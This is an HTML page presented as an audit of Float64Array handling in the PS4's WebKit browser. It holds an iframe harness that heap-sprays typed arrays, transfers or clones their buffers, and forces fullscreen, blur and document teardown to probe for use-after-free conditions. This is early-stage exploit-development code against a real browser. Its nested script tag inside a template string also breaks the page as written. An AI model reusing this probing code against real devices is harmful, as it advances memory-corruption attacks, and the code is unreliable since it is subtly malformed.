<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit Float64Array Registration Audit</title>
<style>
body { font-family: monospace; }
iframe { width: 100%; height: 300px; border: 1px solid #000; }
button { margin: 4px; }
</style>
</head>
<body>

<h2>PARENT LOGGER</h2>
<pre id="log"></pre>

<button onclick="runTest('A')">START TEST A (no registration)</button>
<button onclick="runTest('B')">START TEST B (DataView)</button>
<button onclick="runTest('C')">START TEST C (postMessage transfer)</button>
<button onclick="runTest('D')">START TEST D (structuredClone)</button>

<div id="frameHolder"></div>

<script>
const log = msg => {
  const l = document.getElementById('log');
  l.textContent += msg + "\n";
};

log("[PARENT] Loaded");

function runTest(mode) {
  log("\n=== START TEST " + mode + " ===");
  document.getElementById("frameHolder").innerHTML = "";

  const iframe = document.createElement("iframe");
  document.getElementById("frameHolder").appendChild(iframe);

  iframe.contentWindow.document.open();
  iframe.contentWindow.document.write(`
<!DOCTYPE html>
<html>
<body>
<button id="start">RUN TEST ${mode}</button>
<script>
const send = m => parent.postMessage("[MSG] " + m, "*");

let f64 = null;
let spray = [];

document.getElementById("start").onclick = () => {
  send("[ALLOC] Float64Array length=8");
  f64 = new Float64Array(8);
  f64[0] = 13.37;

  for (let i = 0; i < 500; i++) {
    let s = new Float64Array(16);
    s.fill(1.1);
    spray.push(s);
  }
  send("[SPRAY] Float64Array spray alive=" + spray.length);

  send("[SNAPSHOT] before fullscreen");
  send(" f64.length = " + f64.length);
  send(" f64[0] = " + f64[0]);

  // === REGISTRATION VARIANTS ===
  try {
    if ("${mode}" === "B") {
      send("[REGISTER] DataView");
      window.dv = new DataView(f64.buffer);
    }

    if ("${mode}" === "C") {
      send("[REGISTER] postMessage transfer");
      window.postMessage(f64.buffer, "*", [f64.buffer]);
    }

    if ("${mode}" === "D") {
      send("[REGISTER] structuredClone");
      window.clone = structuredClone(f64);
    }
  } catch (e) {
    send("[REGISTER ERROR] " + e);
  }

  document.documentElement.webkitRequestFullscreen();
  send("[STATE] fullscreen requested");
};

window.onblur = () => {
  send("[EVENT] blur detected");

  send("[SNAPSHOT] after blur");
  try {
    send(" f64.length = " + f64.length);
    send(" f64[0] = " + f64[0]);
  } catch (e) {
    send(" f64 access error");
  }

  send("[TEARDOWN] document.write iframe");
  document.open();
  document.write("<h1>teardown</h1>");
  document.close();
};
</script>
</body>
</html>
  `);
  iframe.contentWindow.document.close();
}

window.addEventListener("message", e => {
  log(e.data);
});
</script>

</body>
</html>
